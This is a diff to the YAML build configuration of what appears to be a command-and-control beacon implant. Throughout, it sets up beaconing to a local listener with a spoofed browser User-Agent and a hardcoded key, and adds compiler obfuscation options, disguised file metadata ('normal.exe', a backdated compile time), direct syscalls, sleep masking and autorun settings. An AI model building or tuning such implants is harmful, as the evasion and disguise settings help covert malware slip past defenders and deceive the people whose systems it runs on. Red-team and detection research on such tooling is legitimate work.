@@ -4,12 +4,31 @@ basic:
     - "127.0.0.1:5001"
   protocol: "tcp"
   tls: false
-  proxy: ""
+  proxy:
   interval: 5
   jitter: 0.2
-  ca: ""
+  ca:
   encryption: aes
   key: maliceofinternal
+  rem:
+    link:
+  http:
+    method: "POST"
+    path: "/pulse"
+    host: "127.0.0.1"
+    version: "1.1"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
+
+build:
+  zigbuild: false
+  ollvm:
+    enable: false
+    bcfobf: false # Bogus Control Flow Obfuscation
+    splitobf: false # Split Control Flow Obfuscation
+    subobf: false # Instruction Substitution Obfuscation
+    fco: false # Function CallSite  Obfuscation
+    constenc: false # Constant Encryption Obfuscation
 
 pulse:
   flags:
@@ -19,20 +38,18 @@ pulse:
     artifact_id: 0
   encryption: xor
   key: "maliceofinternal"
-  target: 127.0.0.1:5002
-  protocol: "tcp"
+  target: 127.0.0.1:80
+  protocol: "http"
   http:
-    method: "GET"
-    path: "/pulse.bin"
+    method: "POST"
+    path: "/pulse"
+    host: "127.0.0.1"
     version: "1.1"
     headers:
-      user_agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
-      accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
-      accept_language: "en-US,en;q=0.5"
-      accept_encoding: "gzip, deflate"
+      User-Agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
 
 metadata:
-  remap_path: "C:/Windows/Users/Maleficarum"
+  remap_path: "C:/Windows/Users/"
   icon: ""
   compile_time: "24 Jun 2015 18:03:01"
   file_version: ""
@@ -42,24 +59,34 @@ metadata:
   original_filename: "normal.exe"
   file_description: "normal"
   internal_name: ""
-
+  require_admin: false  # whether to require admin privilege
+  require_uac: false    # whether to require uac privilege
 
 implants:
-  mod: beacon
-  register_info: true
-  hot_load: true
-  modules:
+  runtime: tokio          # async runtime: smol/tokio/async-std
+  mod: beacon             # malefic mod: beacon/bind
+  register_info: true     # whether collect sysinfo when register
+  hot_load: true          # enable hot load module
+  modules:                # module when malefic compile
     - "full"
-
+  enable_3rd: false       # enable 3rd module
+  3rd_modules:            # 3rd module when malefic compile
+    - "full"
+  autorun: ""             # autorun config filename
+  pack:                   # pack
+  #    - src: "1.docx"
+  #      dst: "1.docs"
   flags:
     start: 0x41
     end: 0x42
     magic: "beautiful"
     artifact_id: 0x1
+
+  # for professional
   apis:
     # apis_level: "sys_apis", "nt_apis"
     level: "nt_apis"
-    # apis_priority: "normal", "user_defined_dyanmic", "func_syscall" "syscalls" 
+    # apis_priority: "normal", "user_defined_dyanmic", "func_syscall" "syscalls"
     priority:
       normal:
         enable: false
@@ -73,11 +100,11 @@ implants:
         # type: "func_syscall", "inline_syscall"
         type: "inline_syscall"
   alloctor:
-    # inprocess: "VirtualAlloc", "VirtualAllocEx", 
-    #            "VirtualAllocExNuma", "HeapAlloc", 
+    # inprocess: "VirtualAlloc", "VirtualAllocEx",
+    #            "VirtualAllocExNuma", "HeapAlloc",
     #            "NtMapViewOfSection", "NtAllocateVirtualMemory"
     inprocess: "NtAllocateVirtualMemory"
-    # allocter_ex: "VirtualAllocEx", "NtAllocateVirtualMemory", 
+    # allocter_ex: "VirtualAllocEx", "NtAllocateVirtualMemory",
     #              "VirtualAllocExNuma", "NtMapViewOfSection"
     crossprocess: "NtAllocateVirtualMemory"
   sleep_mask: true
